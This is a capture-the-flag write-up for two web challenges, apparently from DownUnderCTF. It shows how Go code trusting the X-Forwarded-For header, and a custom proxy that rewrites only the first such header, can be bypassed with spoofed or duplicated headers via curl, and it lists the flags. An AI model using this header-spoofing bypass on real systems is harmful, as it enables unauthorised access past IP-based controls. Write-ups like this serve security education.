# Proxed

## proxed

### Description

Cool haxxorz only

Author: Jordan Bertasso

Application: [http://proxed.duc.tf:30019](http://proxed.duc.tf:30019/)<br>
Downloads: [proxed.tar.gz](https://play.duc.tf/files/362ecec7ddfd885eb7e0a6e48fd1af4e/proxed.tar.gz?token=eyJ1c2VyX2lkIjoyNDI4LCJ0ZWFtX2lkIjoxMjc1LCJmaWxlX2lkIjo5OX0.ZPQ4Ew.FbSAa9wf5MxWt31vzZD3GZeDbEU)

### Analysis

Since there's no frontend we should look inside source code. Main function has only this piece of code which handles request.

```go
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
	xff := r.Header.Values("X-Forwarded-For")

	ip := strings.Split(r.RemoteAddr, ":")[0]

	if xff != nil {
		ips := strings.Split(xff[len(xff)-1], ", ")
		ip = ips[len(ips)-1]
		ip = strings.TrimSpace(ip)
	}

	if ip != "31.33.33.7" {
		message := fmt.Sprintf("untrusted IP: %s", ip)
		http.Error(w, message, http.StatusForbidden)
		return
	} else {
		w.Write([]byte(os.Getenv("FLAG")))
	}
})
```


This piece of block checks if our IP matches `31.33.33.7`. This challenge should be impossible due to `r.RemoteAddr` being set on TCP/IP level and not http, but since `X-Forwarded-For` header replaces the IP, it becomes possible.

_The **[X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)** (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server._

### Solution

Make a request to server with `X-Forwarded-For` header set to desired IP by application.

```powershell
➜ curl -H 'X-Forwarded-For: 31.33.33.7' http://proxed.duc.tf:30019/
DUCTF{17_533m5_w3_f0rg07_70_pr0x}
```
::: tip Flag
`DUCTF{17_533m5_w3_f0rg07_70_pr0x}`
:::

## actually-proxed

### Description

Still cool haxxorz only!!! Except this time I added in a reverse proxy for extra security. Nginx and the standard library proxy are waaaayyy too slow (amateurs). So I wrote my own :D

Author: Jordan Bertasso

Application: [http://actually.proxed.duc.tf:30009](http://actually.proxed.duc.tf:30009/)<br>
Downloads: [actually-proxed.tar.gz](https://play.duc.tf/files/d0933ec4310c85fba1eee53430ec4752/actually-proxed.tar.gz?token=eyJ1c2VyX2lkIjoyNDI4LCJ0ZWFtX2lkIjoxMjc1LCJmaWxlX2lkIjo4Mn0.ZPQ6Lw.WOWUDSJzSeiMDPdUUHNScq5ruL8)

### Analysis

 `docker-entrypoint.sh`:
```bash
#!/bin/sh
# https://docs.docker.com/config/containers/multi-service_container/

cd /app/out

# Start the proxy
./proxy &

# Start the web server
./secret_server &

# Wait for any process to exit
wait -n

# Exit with status of process that exited first
exit $?
```

From entrypoint we know that request goes through proxy and then server. `Request -> Proxy -> Server`

`secret_server` code is almost the same, but this time `X-Forwarded-For` is replaced by proxy.

Inside `parseRequest`, Lines 100-105:

```go
	for i, v := range headers {
		if strings.ToLower(v[0]) == "x-forwarded-for" {
			headers[i][1] = fmt.Sprintf("%s, %s", v[1], clientIP)
			break
		}
	}
```

If we send a request to server with `X-Forwarded-For` header the proxy will change it with our real ip (from TCP layer), but if you have noticed it has one critical bug -> `break`. The header is only checked once and http doesnt care if you supply 1 or 100 headers its going to use the last one.

### Solution

Send `X-Forwarded-For` header twice.

```powershell
➜ curl -H 'X-Forwarded-For: 31.33.33.7' -H 'X-Forwarded-For: 31.33.33.7' http://actually.proxed.duc.tf:30009
DUCTF{y0ur_c0d3_15_n07_b3773r_7h4n_7h3_574nd4rd_l1b}
```
::: tip Flag
`DUCTF{y0ur_c0d3_15_n07_b3773r_7h4n_7h3_574nd4rd_l1b}`
:::